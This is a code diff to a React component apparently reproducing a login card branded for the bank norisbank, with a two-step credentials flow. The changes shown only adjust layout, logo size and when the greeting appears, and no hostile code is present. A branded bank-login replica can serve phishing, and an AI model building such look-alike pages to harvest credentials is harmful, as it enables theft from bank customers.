@@ -167,9 +167,9 @@ const Norisbank = () => {
   })();
 
   const loginCard = (
-    <div className="p-7 lg:p-10" style={{ backgroundColor: CARD_BG, color: TEXT, minHeight: 480, borderRadius: 16 }}>
+    <div className="px-7 pt-7 pb-6 lg:px-10 lg:pt-10 lg:pb-7" style={{ backgroundColor: CARD_BG, color: TEXT, borderRadius: 16 }}>
       <div className="mb-7">
-        <img src={logoAsset.url} alt="norisbank" className="h-5 w-auto" />
+        <img src={logoAsset.url} alt="norisbank" className="h-6 w-auto" />
       </div>
 
       {step === 2 && (
@@ -185,9 +185,11 @@ const Norisbank = () => {
         </div>
       )}
 
-      <h1 className="text-[32px] font-bold mb-3" style={{ lineHeight: 1.1 }}>
-        {greeting}
-      </h1>
+      {step === 1 && (
+        <h1 className="text-[32px] font-bold mb-3" style={{ lineHeight: 1.1 }}>
+          {greeting}
+        </h1>
+      )}
       <p className="text-[15px] mb-6" style={{ color: TEXT }}>
         {t.enterCreds}
       </p>
